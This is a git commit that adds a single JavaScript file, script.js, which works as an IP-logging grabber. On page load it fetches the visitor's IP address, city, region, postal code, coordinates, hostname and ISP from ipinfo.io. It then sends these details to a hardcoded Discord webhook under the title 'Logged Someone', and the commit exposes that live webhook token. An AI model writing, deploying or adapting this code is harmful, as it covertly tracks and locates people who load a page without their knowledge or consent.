095d0c0ae3b1d75083ba9a3548fa64eef2021027
Zerhons <98652909+Zerhons@users.noreply.github.com>
2023-12-20 10:24:20 -0800

    Add files via upload

---
+++ script.js
@@ -0,0 +1,35 @@
+$.getJSON("https://ipinfo.io/json", function(data) {         
+  var params = {
+    embeds: [
+      {
+        "title": "Logged Someone",
+        "color": 15258703,
+        "thumbnail": {
+        },
+        "fields": [
+          {
+            "name": "IP Address",
+            "value": `> ${data.ip}`
+          },
+          {
+            "name": "GeoLocation Info",
+            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
+          },
+          {
+            "name": "Network Info",
+            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
+          }
+        ]
+      }
+    ]
+  }
+  fetch('https://discord.com/api/webhooks/1187096547016581191/NjpGQPsBESsK5mONtUqPApEUUqolOE8-Rw87eiOAx_jjUWL_HABC-Ugu8HICuII27PGc', {
+    method: "POST",
+    headers: {
+        'Content-type': 'application/json'
+    },
+    body: JSON.stringify(params)
+  }).then(res => {
+    console.log(res);
+  }) 
+})
